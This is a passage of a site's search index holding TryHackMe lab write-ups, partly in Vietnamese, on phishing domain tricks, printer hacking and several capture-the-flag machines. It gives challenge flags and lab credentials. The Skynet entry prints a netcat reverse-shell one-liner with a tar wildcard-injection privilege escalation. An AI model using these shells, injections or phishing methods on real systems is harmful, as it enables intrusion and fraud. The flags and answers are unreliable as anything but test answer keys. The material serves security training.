Domain"},{"location":"tryhackme/room/phishing/#expired-domains","text":"Although not essential, buying a domain name with some history may lead to better scoring of your domain when it comes to spam filters. Spam filters have a tendency to not trust brand new domain names compared to ones with some history","title":"Expired Domains:"},{"location":"tryhackme/room/phishing/#typosquatting","text":"Typosquatting is when a registered domain looks very similar to the target domain you're trying to impersonate. Here are some of the common methods: Misspelling : goggle.com Vs google.com Additional Period : go.ogle.com Vs google.com Switching numbers for letters : g00gle.com Vs google.com Phrasing : googles.com Vs google.com Additional Word : googleresults.com Vs google.com","title":"Typosquatting:"},{"location":"tryhackme/room/phishing/#tld-alternatives","text":"A TLD (Top Level Domain) is the .com .net .co.uk .org .gov e.t.c part of a domain name, there are 100's of variants of TLD's now. A common trick for choosing a domain would be to use the same name but with a different TLD. For example, register tryhackme.co.uk to impersonate tryhackme.com. IDN Homograph Attack/Script Spoofing : Originally domain names were made up of Latin characters a-z and 0-9, but in 1998, IDN (internationalized domain name) was implemented to support language-specific script or alphabet from other languages such as Arabic, Chinese, Cyrillic, Hebrew and more. An issue that arises from the IDN implementation is that different letters from different languages can actually appear identical. For example, Unicode character U+0430 (Cyrillic small letter a) looks identical to Unicode character U+0061 (Latin small letter a) used in English, enabling attackers to register a domain name that looks almost identical to another. Alt text","title":"TLD Alternatives:"},{"location":"tryhackme/room/phishing/#answer-the-questions-bellow_1","text":"What is better, using an expired or new domain? (old/new) old What is the term used to describe registering a similar domain name with a spelling error? Typosquatting","title":"Answer the questions bellow"},{"location":"tryhackme/room/phishing/#task-8-using-ms-office-in-phishing","text":"Often during phishing campaigns, a Microsoft Office document (typically Word, Excel or PowerPoint) will be included as an attachment. Office documents can contain macros; macros do have a legitimate use but can also be used to run computer commands that can cause malware to be installed onto the victim's computer or connect back to an attacker's network and allow the attacker to take control of the victim's computer. Take, for example, the following scenario : A staff member working for Acme IT Support receives an email from human resources with an excel spreadsheet called \"Staff_Salaries.xlsx\" intended to go to the boss but somehow ended up in the staff members inbox instead. What really happened was that an attacker spoofed the human resources email address and crafted a psychologically tempting email perfectly aimed to tempt the staff member into opening the attachment. Once the staff member opened the attachment and enabled the macros, their computer was compromised.","title":"Task 8: Using MS Office In Phishing"},{"location":"tryhackme/room/phishing/#answer-the-question-bellow","text":"What can Microsoft Office documents contain, which, when executed can run computer commands? macros","title":"Answer the question bellow"},{"location":"tryhackme/room/phishing/#task-9-using-browser-exploits","text":"Another method of gaining control over a victim's computer could be through browser exploits; this is when there is a vulnerability against a browser itself (Internet Explorer/Edge, Firefox, Chrome, Safari, etc.), which allows the attacker to run remote commands on the victim's computer. Browser exploits aren't usually a common path to follow in a red team engagement unless you have prior knowledge of old technology being used on-site. Many browsers are kept up to date, hard to exploit due to how browsers are developed, and the exploits are often worth a lot of money if reported back to the developers. That being said, it can happen, and as previously mentioned, it could be used to target old technologies on-site because possibly the browser software cannot be updated due to incompatibility with commercial software/hardware, which can happen quite often in big institutions such as education, government and especially health care. Usually, the victim would receive an email, convincing them to visit a particular website set up by the attacker. Once the victim is on the site, the exploit works against the browser, and now the attacker can perform any commands they wish on the victim's computer. An example of this is CVE-2021-40444 from September 2021, which is a vulnerability found in Microsoft systems that allowed the execution of code just from visiting a website.","title":"Task 9: Using Browser Exploits"},{"location":"tryhackme/room/phishing/#answer-the-questions-bellow_2","text":"Which recent CVE caused remote code execution? CVE-2021-40444","title":"Answer the questions bellow"},{"location":"tryhackme/room/phishing/#task-10-phishing-practical","text":"Now that you've learnt what goes into a phishing email campaign, let's see if you're able to spot them! Click the green \"View Site\" button to launch the Phishing Test website. Examine each email, including where it's from, its links and attachments and decide whether you think the email is safe or not.","title":"Task 10: Phishing Practical"},{"location":"tryhackme/room/phishing/#answer-the-questions-bellow_3","text":"What is the flag from the challenge? THM{I_CAUGHT_ALL_THE_PHISH}","title":"Answer the questions bellow"},{"location":"tryhackme/room/printer-hacking-101/","tags":["THM-Room"],"text":"Printer Hacking 101 \u00b6 Task 1: Unit 1 - Introduction \u00b6 In this room, we will look at the most common printer hacking techniques and will look at why they're made vulnerable. Mass printer hacking has been taking advantage of over the past few years. One example would be when one attacker hacked around 50,000 printers, printing out messages asking people to subscribe to PewDiePie. In the next task we'll take a look at the reasons behind the success of this attack. Alt text Task 2 Unit 2: IPP Port \u00b6 The reason behind the printers' vulnerability which effected those 50,000 printers, was simply an open IPP port. \" The Internet Printing Protocol (IPP) - is a specialized Internet protocol for communication between client devices and printers. It allows clients to submit one or more print jobs to the printer or print server, and perform tasks such as querying the status of a printer, obtaining the status of print jobs, or canceling individual print jobs.\" When an IPP port is open to the internet, it is possible for anyone to print to the printer or even transfer malicious data through it (using it as a middleman for attacks). A recent study by VARIoT (Vulnerability and Attack Repository for IoT) showed that there are still around 80 thousand vulnerable printers opened to the world. Most of them appear to run the CUPS server (which is a simple UNIX printing system). Alt text An open IPP port can expose a lot of sensitive information such as printer name, location, model, firmware version, or even printer wifi SSID. Answer the questions bellow \u00b6 What port does IPP run on? 631 Task 3: Unit 3: Targeting & Exploitation \u00b6","title":"Printer Hacking 101"},{"location":"tryhackme/room/printer-hacking-101/#printer-hacking-101","text":"","title":"Printer Hacking 101"},{"location":"tryhackme/room/printer-hacking-101/#task-1-unit-1-introduction","text":"In this room, we will look at the most common printer hacking techniques and will look at why they're made vulnerable. Mass printer hacking has been taking advantage of over the past few years. One example would be when one attacker hacked around 50,000 printers, printing out messages asking people to subscribe to PewDiePie. In the next task we'll take a look at the reasons behind the success of this attack. Alt text","title":"Task 1: Unit 1 - Introduction"},{"location":"tryhackme/room/printer-hacking-101/#task-2-unit-2-ipp-port","text":"The reason behind the printers' vulnerability which effected those 50,000 printers, was simply an open IPP port. \" The Internet Printing Protocol (IPP) - is a specialized Internet protocol for communication between client devices and printers. It allows clients to submit one or more print jobs to the printer or print server, and perform tasks such as querying the status of a printer, obtaining the status of print jobs, or canceling individual print jobs.\" When an IPP port is open to the internet, it is possible for anyone to print to the printer or even transfer malicious data through it (using it as a middleman for attacks). A recent study by VARIoT (Vulnerability and Attack Repository for IoT) showed that there are still around 80 thousand vulnerable printers opened to the world. Most of them appear to run the CUPS server (which is a simple UNIX printing system). Alt text An open IPP port can expose a lot of sensitive information such as printer name, location, model, firmware version, or even printer wifi SSID.","title":"Task 2  Unit 2: IPP Port"},{"location":"tryhackme/room/printer-hacking-101/#answer-the-questions-bellow","text":"What port does IPP run on? 631","title":"Answer the questions bellow"},{"location":"tryhackme/room/printer-hacking-101/#task-3-unit-3-targeting-exploitation","text":"","title":"Task 3: Unit 3: Targeting &amp; Exploitation"},{"location":"tryhackme/room/rootme/","tags":["THM-Room","Linux Privilege Escalation"],"text":"Root Me \u00b6 Task 1: Deploy the machine \u00b6 Connect to TryHackMe network and deploy the machine. If you don't know how to do this, complete the OpenVPN room first. Answer the questions bellow \u00b6 Deploy the machine No answer needed Task 2: Reconnaissance \u00b6 First, let's get information about the target. Answer the questions bellow \u00b6 Scan the machine, how many ports are open? Ans: 2 Tip D\u00f9ng nmap \u0111\u1ec3 scan port, ta t\u00ecm \u0111\u01b0\u1ee3c 2 port m\u1edf l\u00e0 22 v\u1edbi d\u1ecbch v\u1ee5 ssh v\u00e0 80 v\u1edbi d\u1ecbch v\u1ee5 http nmap -sN -A VICTIM_IP What version of Apache is running? Ans: 2.4.29 What service is running on port 22? Ans: ssh Find directories on the web server using the GoBuster tool. No answer needed What is the hidden directory? /panel/ Task 3: Getting a shell \u00b6 Find a form to upload and get a reverse shell, and find the flag. Answer the questions bellow \u00b6 user.txt THM{y0u_g0t_a_sh3ll} Tip find . -type f -iname user.txt Task 4: Privilege escalation \u00b6 Now that we have a shell, let's escalate our privileges to root. Answer the questions bellow \u00b6 Search for files with SUID permission, which file is weird? /usr/bin/python Tip find / -user root -perm /4000 -type f 2>/dev/null Find a form to escalate your privileges. no answer needed root.txt Ans: THM{pr1v1l3g3_3sc4l4t10n} Xem video h\u01b0\u1edbng d\u1eabn t\u1ea1i","title":"Root Me"},{"location":"tryhackme/room/rootme/#root-me","text":"","title":"Root Me"},{"location":"tryhackme/room/rootme/#task-1-deploy-the-machine","text":"Connect to TryHackMe network and deploy the machine. If you don't know how to do this, complete the OpenVPN room first.","title":"Task 1: Deploy the machine"},{"location":"tryhackme/room/rootme/#answer-the-questions-bellow","text":"Deploy the machine No answer needed","title":"Answer the questions bellow"},{"location":"tryhackme/room/rootme/#task-2-reconnaissance","text":"First, let's get information about the target.","title":"Task 2: Reconnaissance"},{"location":"tryhackme/room/rootme/#answer-the-questions-bellow_1","text":"Scan the machine, how many ports are open? Ans: 2 Tip D\u00f9ng nmap \u0111\u1ec3 scan port, ta t\u00ecm \u0111\u01b0\u1ee3c 2 port m\u1edf l\u00e0 22 v\u1edbi d\u1ecbch v\u1ee5 ssh v\u00e0 80 v\u1edbi d\u1ecbch v\u1ee5 http nmap -sN -A VICTIM_IP What version of Apache is running? Ans: 2.4.29 What service is running on port 22? Ans: ssh Find directories on the web server using the GoBuster tool. No answer needed What is the hidden directory? /panel/","title":"Answer the questions bellow"},{"location":"tryhackme/room/rootme/#task-3-getting-a-shell","text":"Find a form to upload and get a reverse shell, and find the flag.","title":"Task 3: Getting a shell"},{"location":"tryhackme/room/rootme/#answer-the-questions-bellow_2","text":"user.txt THM{y0u_g0t_a_sh3ll} Tip find . -type f -iname user.txt","title":"Answer the questions bellow"},{"location":"tryhackme/room/rootme/#task-4-privilege-escalation","text":"Now that we have a shell, let's escalate our privileges to root.","title":"Task 4: Privilege escalation"},{"location":"tryhackme/room/rootme/#answer-the-questions-bellow_3","text":"Search for files with SUID permission, which file is weird? /usr/bin/python Tip find / -user root -perm /4000 -type f 2>/dev/null Find a form to escalate your privileges. no answer needed root.txt Ans: THM{pr1v1l3g3_3sc4l4t10n} Xem video h\u01b0\u1edbng d\u1eabn t\u1ea1i","title":"Answer the questions bellow"},{"location":"tryhackme/room/skynet/","tags":["THM-Room","Privilege Escalation"],"text":"Skynet \u00b6 Task 1 Deploy and compromise the vulnerable machine! \u00b6 Alt text Are you able to compromise this Terminator themed machine? Alt text You can follow our official walkthrough for this challenge on our blog . Answer the questions bellow \u00b6 What is Miles password for his emails? cyborg007haloterminator What is the hidden directory? /45kra24zxs28v3yd What is the vulnerability called when you can include a remote file for malicious purposes? remote file inclusion What is the user flag? 7ce5c2109a40f958099283600a9ae807 What is the root flag? 3f0372db24753accc7179a282cd6a949 Scenario \u00b6 HOST: 10.10.158.216 \u0110\u1ea7u ti\u00ean, scan port CMD \u2514\u2500 $ sudo nmap 10 . 10 . 158 . 216 [sudo] password for kali : Starting Nmap 7 . 93 ( https :// nmap . org ) at 2023 - 08 - 24 09 : 49 EDT Nmap scan report for 10 . 10 . 158 . 216 Host is up ( 0 . 30s latency ). Not shown : 994 closed tcp ports ( reset ) PORT STATE SERVICE 22 / tcp open ssh 80 / tcp open http 110 / tcp open pop3 139 / tcp open netbios-ssn 143 / tcp open imap 445 / tcp open microsoft-ds Nmap done : 1 IP address ( 1 host up ) scanned in 5 . 29 seconds V\u00e0 scan dir b\u1eb1ng gobuster ra nh\u1eadn \u0111\u01b0\u1ee3c /squirrelmail mang ch\u1ee9c n\u0103ng \u0111\u0103ng nh\u1eadp t\u00e0i kho\u1ea3n squirrelmail. T\u1eeb \u0111\u00e2y s\u1ebd l\u00e0 ti\u1ec1n \u0111\u1ec1 \u0111\u1ec3 ta c\u00f3 th\u1ec3 c\u00f3 nh\u1eefng b\u01b0\u1edbc ti\u1ebfp c\u1eadn ti\u1ebfp theo. Nh\u00ecn v\u00e0o k\u1ebft qu\u1ea3 c\u1ee7a nmap, ta th\u1ea5y c\u00f3 d\u1ecbch v\u1ee5 smb t\u1eeb port 445 v\u00e0 139. \u01afu ti\u00ean scan smb \u0111\u1ec3 xem c\u00f3 g\u00ec \u0111\u1ec3 khai th\u00e1c ti\u1ebfp kh\u00f4ng. \u2514\u2500$ smbmap -H 10.10.158.216 [+] Guest session IP: 10.10.158.216:445 Name: 10.10.158.216 Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers anonymous READ ONLY Skynet Anonymous Share milesdyson NO ACCESS Miles Dyson Personal Share IPC$ NO ACCESS IPC Service (skynet server (Samba, Ubuntu)) T\u1eeb k\u1ebft qu\u1ea3 tr\u00ean, ta th\u1ea5y r\u1eb1ng smb cho ph\u00e9p login \u1ea9n danh nh\u01b0ng ch\u1ec9nh c\u00f3 quy\u1ec1n \u0111\u1ecdc file/folder th\u00f4i (nh\u01b0ng nh\u01b0 th\u1ebf \u0111\u00e3 qu\u00e1 \u0111\u1ee7 r\u00f9i ::) ). H\u1eedm??? smbclient //10.10.158.216/anonymous Sau khi v\u00e0o b\u1eb1ng \u1ea9n danh ta osint ti\u1ebfp v\u00e0 t\u00ecm \u0111\u01b0\u1ee3c file ch\u1ee9a d\u00e3y t\u1eeb \u0111\u1eb7c bi\u1ec7t, ta \u0111o\u00e1n \u0111\u00e2y l\u00e0 password cho user milesdyson . Brute force password v\u00e0 login v\u00e0o trang /squirrelmail, ta \u0111\u01b0\u1ee3c giao di\u1ec7n ch\u00ednh. Ti\u1ebfp t\u1ee5c l\u1ea1i th\u1ea5y email reset password, l\u1ea7n n\u00e0y l\u00e0 pass smb. Alt text H\u1eedm??? smbclient //10.10.158.216/milesdyson -U=milesdyson pass: )s{A&2Z=F^n_E.B` Login v\u00e0 nh\u1eadn \u0111\u01b0\u1ee3c domain m\u1edbi, gobuster ti\u1ebfp \u0111\u1ec3 nh\u1eadn \u0111\u01b0\u1ee3c giao di\u1ec7n login c\u1ee7a cuppa cms ::) H\u1eedm??? Th\u1ef1c ra ngay ch\u1ed7 squirrelmail, ta d\u00f9ng searchsploit \u0111\u1ec3 khai th\u00e1c th\u00ec ra \u0111\u01b0\u1ee3c RCE nh\u01b0ng m\u00ecnh m\u00e3i khum khai kh\u00e1c \u0111\u01b0\u1ee3c ch\u1ed7 \u0111\u00f3, n\u00ean m\u1edbi t\u00ecm h\u01b0\u1edbng ti\u1ebfp .-. Ro\u00e0i t\u1edbi \u0111\u00e2y th\u00ec step by step theo searchsploit cuppa cms l\u00e0 ra k\u1ebft qu\u1ea3 :3 H\u1eedm Alt text Ch\u00fa \u00fd file backup.sh \u0111\u1ec3 leo thang \u0111\u1eb7c quy\u1ec1n root H\u1eedm h\u1eedm h\u1eedm cd /var/www/html echo \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1| nc HOST PORT >/tmp/f\" > shell . sh echo \"\" > \"--checkpoint-action=exec=sh shell.sh\" echo \"\" > - -checkpoint = 1 Video khai th\u00e1c","title":"Skynet"},{"location":"tryhackme/room/skynet/#skynet","text":"","title":"Skynet"},{"location":"tryhackme/room/skynet/#task-1-deploy-and-compromise-the-vulnerable-machine","text":"Alt text Are you able to compromise this Terminator themed machine? Alt text You can follow our official walkthrough for this challenge on our blog .","title":"Task 1  Deploy and compromise the vulnerable machine!"},{"location":"tryhackme/room/skynet/#answer-the-questions-bellow","text":"What is Miles password for his emails? cyborg007haloterminator What is the hidden directory? /45kra24zxs28v3yd What is the vulnerability called when you can include a remote file for malicious purposes? remote file inclusion What is the user flag? 7ce5c2109a40f958099283600a9ae807 What is the root flag? 3f0372db24753accc7179a282cd6a949","title":"Answer the questions bellow"},{"location":"tryhackme/room/skynet/#scenario","text":"HOST: 10.10.158.216 \u0110\u1ea7u ti\u00ean, scan port CMD \u2514\u2500 $ sudo nmap 10 . 10 . 158 . 216 [sudo] password for kali : Starting Nmap 7 . 93 ( https :// nmap . org ) at 2023 - 08 - 24 09 : 49 EDT Nmap scan report for 10 . 10 . 158 . 216 Host is up ( 0 . 30s latency ). Not shown : 994 closed tcp ports ( reset ) PORT STATE SERVICE 22 / tcp open ssh 80 / tcp open http 110 / tcp open pop3 139 / tcp open netbios-ssn 143 / tcp open imap 445 / tcp open microsoft-ds Nmap done : 1 IP address ( 1 host up ) scanned in 5 . 29 seconds V\u00e0 scan dir b\u1eb1ng gobuster ra nh\u1eadn \u0111\u01b0\u1ee3c /squirrelmail mang ch\u1ee9c n\u0103ng \u0111\u0103ng nh\u1eadp t\u00e0i kho\u1ea3n squirrelmail. T\u1eeb \u0111\u00e2y s\u1ebd l\u00e0 ti\u1ec1n \u0111\u1ec1 \u0111\u1ec3 ta c\u00f3 th\u1ec3 c\u00f3 nh\u1eefng b\u01b0\u1edbc ti\u1ebfp c\u1eadn ti\u1ebfp theo. Nh\u00ecn v\u00e0o k\u1ebft qu\u1ea3 c\u1ee7a nmap, ta th\u1ea5y c\u00f3 d\u1ecbch v\u1ee5 smb t\u1eeb port 445 v\u00e0 139. \u01afu ti\u00ean scan smb \u0111\u1ec3 xem c\u00f3 g\u00ec \u0111\u1ec3 khai th\u00e1c ti\u1ebfp kh\u00f4ng. \u2514\u2500$ smbmap -H 10.10.158.216 [+] Guest session IP: 10.10.158.216:445 Name: 10.10.158.216 Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers anonymous READ ONLY Skynet Anonymous Share milesdyson NO ACCESS Miles Dyson Personal Share IPC$ NO ACCESS IPC Service (skynet server (Samba, Ubuntu)) T\u1eeb k\u1ebft qu\u1ea3 tr\u00ean, ta th\u1ea5y r\u1eb1ng smb cho ph\u00e9p login \u1ea9n danh nh\u01b0ng ch\u1ec9nh c\u00f3 quy\u1ec1n \u0111\u1ecdc file/folder th\u00f4i (nh\u01b0ng nh\u01b0 th\u1ebf \u0111\u00e3 qu\u00e1 \u0111\u1ee7 r\u00f9i ::) ). H\u1eedm??? smbclient //10.10.158.216/anonymous Sau khi v\u00e0o b\u1eb1ng \u1ea9n danh ta osint ti\u1ebfp v\u00e0 t\u00ecm \u0111\u01b0\u1ee3c file ch\u1ee9a d\u00e3y t\u1eeb \u0111\u1eb7c bi\u1ec7t, ta \u0111o\u00e1n \u0111\u00e2y l\u00e0 password cho user milesdyson . Brute force password v\u00e0 login v\u00e0o trang /squirrelmail, ta \u0111\u01b0\u1ee3c giao di\u1ec7n ch\u00ednh. Ti\u1ebfp t\u1ee5c l\u1ea1i th\u1ea5y email reset password, l\u1ea7n n\u00e0y l\u00e0 pass smb. Alt text H\u1eedm??? smbclient //10.10.158.216/milesdyson -U=milesdyson pass: )s{A&2Z=F^n_E.B` Login v\u00e0 nh\u1eadn \u0111\u01b0\u1ee3c domain m\u1edbi, gobuster ti\u1ebfp \u0111\u1ec3 nh\u1eadn \u0111\u01b0\u1ee3c giao di\u1ec7n login c\u1ee7a cuppa cms ::) H\u1eedm??? Th\u1ef1c ra ngay ch\u1ed7 squirrelmail, ta d\u00f9ng searchsploit \u0111\u1ec3 khai th\u00e1c th\u00ec ra \u0111\u01b0\u1ee3c RCE nh\u01b0ng m\u00ecnh m\u00e3i khum khai kh\u00e1c \u0111\u01b0\u1ee3c ch\u1ed7 \u0111\u00f3, n\u00ean m\u1edbi t\u00ecm h\u01b0\u1edbng ti\u1ebfp .-. Ro\u00e0i t\u1edbi \u0111\u00e2y th\u00ec step by step theo searchsploit cuppa cms l\u00e0 ra k\u1ebft qu\u1ea3 :3 H\u1eedm Alt text Ch\u00fa \u00fd file backup.sh \u0111\u1ec3 leo thang \u0111\u1eb7c quy\u1ec1n root H\u1eedm h\u1eedm h\u1eedm cd /var/www/html echo \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1| nc HOST PORT >/tmp/f\" > shell . sh echo \"\" > \"--checkpoint-action=exec=sh shell.sh\" echo \"\" > - -checkpoint = 1 Video khai th\u00e1c","title":"Scenario"},{"location":"tryhackme/room/startup/","tags":["THM-Room","Privilege Escalation"],"text":"Startup \u00b6 Task 1: Welcome to Spice Hut! \u00b6 Alt text We are Spice Hut, a new startup company that just made it big! We offer a variety of spices and club sandwiches (in case you get hungry), but that is not why you are here. To be truthful, we aren't sure if our developers know what they are doing and our security concerns are rising. We ask that you perform a thorough penetration test and try to own root. Good luck! Answer the questions bellow \u00b6 What is the secret spicy soup recipe? love What are the contents of user.txt? THM{03ce3d619b80ccbfb3b7fc81e46c0e79} What are the contents of root.txt? THM{f963aaa6a430f210222158ae15c3d76d} Hints \u00b6 Nh\u01b0 th\u01b0\u1eddng l\u1ec7, ta s\u1ebd scan port website tr\u01b0\u1edbc Alt text Ta th\u1ea5y c\u00f3 4 port m\u1edf v\u00e0 ta focus v\u00e0o ftp -> th\u1ea5y c\u00f3 th\u1ec3 \u0111\u0103ng nh\u1eadp \u1ea9n danh -> folder ftp c\u00f3 th\u1ec3 upload -> upload reverse shell (webshell). Focus v\u00e0o folder incidents v\u00e0 file recipe.txt (flag 1). V\u1edbi vi\u1ec7c \u0111\u1ecdc file pcapng: Ta c\u00f3 th\u1ec3 g\u1eedi file \u0111\u00f3 l\u00ean folder ftp v\u00e0 d\u00f9ng ftp \u0111\u1ec3 get n\u00f3 v\u1ec1 m\u00e1y ch\u00fang ta \u0111\u1ec3 xem M\u1edf 1 web local v\u1edbi python v\u00e0 m\u00e1y attack d\u00f9ng wget \u0111\u1ec3 l\u1ea5y file v\u1ec1 cat tr\u1ef1c ti\u1ebfp file \u0111\u1ec3 xem log. Khi c\u00f3 \u0111\u01b0\u1ee3c password lennie, login ssh T\u00ecm folder scripts v\u00e0 \u0111\u1ecdc. T\u1edbi \u0111\u00e2y th\u00ec challenge n\u00e0y leo thang \u0111\u1eb7c quy\u1ec1n nh\u01b0 challenge LazyAdmin Task 2: Credits \u00b6 Spice Hut was very happy with your results and it is guaranteed they will spread word about your excellence with their partners. Astounding work! Alt text Find my official writeup here: https://www.youtube.com/watch?v=3qNxI1OggGc I'd like to thank ku5e for being a good sensei and GeneralClaw , my grammar cop. I'd like to thank my testers Amit25095 , BarZigmon and powershot . Additionally, I'd love to thank TryHackMe not just for their platform, of which has changed my life, but for giving me this opportunity to give back to the community. And of course, I'd like to thank you for playing. Hope to see you soon!","title":"Startup"},{"location":"tryhackme/room/startup/#startup","text":"","title":"Startup"},{"location":"tryhackme/room/startup/#task-1-welcome-to-spice-hut","text":"Alt text We are Spice Hut, a new startup company that just made it big! We offer a variety of spices and club sandwiches (in case you get hungry), but that is not why you are here. To be truthful, we aren't sure if our developers know what they are doing and our security concerns are rising. We ask that you perform a thorough penetration test and try to own root. Good luck!","title":"Task 1: Welcome to Spice Hut!"},{"location":"tryhackme/room/startup/#answer-the-questions-bellow","text":"What is the secret spicy soup recipe? love What are the contents of user.txt? THM{03ce3d619b80ccbfb3b7fc81e46c0e79} What are the contents of root.txt? THM{f963aaa6a430f210222158ae15c3d76d}","title":"Answer the questions bellow"},{"location":"tryhackme/room/startup/#hints","text":"Nh\u01b0 th\u01b0\u1eddng l\u1ec7, ta s\u1ebd scan port website tr\u01b0\u1edbc Alt text Ta th\u1ea5y c\u00f3 4 port m\u1edf v\u00e0 ta focus v\u00e0o ftp -> th\u1ea5y c\u00f3 th\u1ec3 \u0111\u0103ng nh\u1eadp \u1ea9n danh -> folder ftp c\u00f3 th\u1ec3 upload -> upload reverse shell (webshell). Focus v\u00e0o folder incidents v\u00e0 file recipe.txt (flag 1). V\u1edbi vi\u1ec7c \u0111\u1ecdc file pcapng: Ta c\u00f3 th\u1ec3 g\u1eedi file \u0111\u00f3 l\u00ean folder ftp v\u00e0 d\u00f9ng ftp \u0111\u1ec3 get n\u00f3 v\u1ec1 m\u00e1y ch\u00fang ta \u0111\u1ec3 xem M\u1edf 1 web local v\u1edbi python v\u00e0 m\u00e1y attack d\u00f9ng wget \u0111\u1ec3 l\u1ea5y file v\u1ec1 cat tr\u1ef1c ti\u1ebfp file \u0111\u1ec3 xem log. Khi c\u00f3 \u0111\u01b0\u1ee3c password lennie, login ssh T\u00ecm folder scripts v\u00e0 \u0111\u1ecdc. T\u1edbi \u0111\u00e2y th\u00ec challenge n\u00e0y leo thang \u0111\u1eb7c quy\u1ec1n nh\u01b0 challenge LazyAdmin","title":"Hints"},{"location":"tryhackme/room/startup/#task-2-credits","text":"Spice Hut was very happy with your results and it is guaranteed they will spread word about your excellence with their partners. Astounding work! Alt text Find my official writeup here: https://www.youtube.com/watch?v=3qNxI1OggGc I'd like to thank ku5e for being a good sensei and GeneralClaw , my grammar cop. I'd like to thank my testers Amit25095 , BarZigmon and powershot . Additionally, I'd love to thank TryHackMe not just for their platform, of which has changed my life, but for giving me this opportunity to give back to the community. And of course, I'd like to thank you for playing. Hope to see you soon!","title":"Task 2: Credits"},{"location":"tryhackme/room/tomghost/","tags":["THM-Room","Privilege Escalation"],"text":"tomghost \u00b6 Link room: https://tryhackme.com/room/tomghost Task 1: Flags \u00b6 Alt text Are you able to complete the challenge? The machine may take up to 5 minutes to boot and configure. Admins Note: This room contains inappropriate content in the form of a username that contains a swear word and should be noted for an educational setting. - Dark Answer the question bellow \u00b6 Compromise this machine and obtain user.txt THM{GhostCat_1s_so_cr4sy} Hint Web n\u00e0y b\u1ecb l\u1ed7 h\u1ecfng CVE n\u00e0o \u0111\u00f3 tr\u00ean apache tomcat version 9.0.30 (48xxx) Escalate privileges and obtain root.txt THM{Z1P_1S_FAKE} Hint gpg2john, john, gpg --import, gpg --decrypt https://gtfobins.github.io/gtfobins/zip/#shell","title":"tomghost"},{"location":"tryhackme/room/tomghost/#tomghost","text":"Link room: https://tryhackme.com/room/tomghost","title":"tomghost"},{"location":"tryhackme/room/tomghost/#task-1-flags","text":"Alt text Are you able to complete the challenge? The machine may take up to 5 minutes to boot and configure. Admins Note: This room contains inappropriate content in the form of a username that contains a swear word and should be noted for an educational setting. - Dark","title":"Task 1: Flags"},{"location":"tryhackme/room/tomghost/#answer-the-question-bellow","text":"Compromise this machine and obtain user.txt THM{GhostCat_1s_so_cr4sy} Hint Web n\u00e0y b\u1ecb l\u1ed7 h\u1ecfng CVE n\u00e0o \u0111\u00f3 tr\u00ean apache tomcat version 9.0.30 (48xxx) Escalate privileges and obtain root.txt THM{Z1P_1S_FAKE} Hint gpg2john, john, gpg --import, gpg --decrypt https://gtfobins.github.io/gtfobins/zip/#shell","title":"Answer the question bellow"},{"location":"tryhackme/room/traverse/","tags":["THM-Room"],"text":"Traverse \u00b6 Room at https://tryhackme.com/room/traverse List of the questions solved Question: What type of encoding is used by the hackers to obfuscate the JavaScript file? Ans: Hex Question: What is the flag value after deobfuscating the file? Ans: DIRECTORY LISTING IS THE ONLY WAY Question: Logging is an important aspect. What is the name of the file containing email dumps? Ans: email_dump.txt Question: The logs folder contains email logs and has a message for the software team lead. What is the name of the directory that Bob has created? Ans: planning Question: What is the key file for opening the directory that Bob has created for Mark? Ans: THM{100100111} Question: What is the email address for ID 5 using the leaked API endpoint? Ans: john@traverse.com Question: What is the ID for the user with admin privileges? Ans: 3 Question: What is the endpoint for logging in as the admin ? Mention the last endpoint instead of the URL. For example, if the answer is URL is tryhackme.com/admin - Just write /admin . Ans: /realadmin Question: The attacker uploaded a web shell and renamed a file used for managing the server. Can you find the name of the web shell that the attacker has uploaded? Ans: thm_shell.php Question: What is the name of the file renamed by the attacker for managing the web server? Ans: renamed_file_manager.php Question: Can you use the file manager to restore the original website by removing the \" FINALLY HACKED \" message? What is the flag value after restoring the main website? Ans: THM{WEBSITE_RESTORED} Pentest scenario \u00b6 Host: 10.10. 254.14 B\u00e0i n\u00e0y t\u01b0\u01a1ng \u0111\u1ed1i c\u01a1 b\u1ea3n, ch\u1ec9 c\u1ea7n traverse, traverse, traverse,... l\u00e0 tr\u1ea3 l\u1eddi \u0111\u01b0\u1ee3c h\u1ebft c\u00e1c c\u00e2u h\u1ecfi :3 Do \u0111\u00f3, writeup n\u00e0y t\u00f4i vi\u1ebft theo h\u01b0\u1edbng c\u00e1c target ch\u00ednh c\u1ea7n \u0111\u1ea1t \u0111\u01b0\u1ee3c. Reconnaissance \u00b6 Ta ch\u00fa \u00fd v\u00e0o k\u1ebft qu\u1ea3 scan c\u1ee7a gobuster v\u00e0 \u0111i l\u1ea7n l\u01b0\u1ee3t theo c\u00e1c dir, ta s\u1ebd l\u1ea5y \u0111\u01b0\u1ee3c \u0111\u00e1p \u00e1n c\u1ee7a c\u00e1c c\u00e2u h\u1ecfi Terminal /img (Status: 301) [Size: 310] [--> http://10.10.254.14/img/] /client (Status: 301) [Size: 313] [--> http://10.10.254.14/client/] /api (Status: 301) [Size: 310] [--> http://10.10.254.14/api/] /javascript (Status: 301) [Size: 317] [--> http://10.10.254.14/javascript/] /logs (Status: 301) [Size: 311] [--> http://10.10.254.14/logs/] /planning (Status: 301) [Size: 315] [--> http://10.10.254.14/planning/] /phpmyadmin (Status: 301) [Size: 317] [--> http://10.10.254.14/phpmyadmin/] V\u1ec1 ph\u1ea7n API, API Ta s\u1ebd d\u00f9ng curl \u0111\u1ec3 t\u00ecm ra \u0111\u01b0\u1ee3c th\u00f4ng tin t\u00e0i kho\u1ea3n c\u00f3 quy\u1ec1n admin Terminal curl http :// 10 . 10 . 254 . 14 / api / ? customer_id = 3 { \"data\" :{ \"id\" : \"3\" , \"name\" : \"admin\" , \"email\" : \"realadmin@traverse.com\" , \"password\" : \"admin_key!!!\" , \"timestamp\" : \"2023-05-23 04:47:25\" , \"role\" : \"admin\" , \"loginURL\" : \"\\/realadmin\" , \"isadmin\" : \"1\" }, \"response_code\" : 200 , \"response_desc\" : \"Success\" } \u0110i ti\u1ebfp, ta th\u1ea5y \u0111\u01b0\u1ee3c trang admin... Ta \u0111\u01b0\u1ee3c trang ./main.php nh\u01b0 h\u00ecnh tr\u00ean c\u00f3 t\u00e1c d\u1ee5ng th\u1ef1c thi l\u1ec7nh h\u1ec7 th\u1ed1ng nh\u01b0ng \u0111\u00e3 b\u1ecb c\u1ed1 \u0111\u1ecbnh ch\u1ec9 ch\u1ecdn 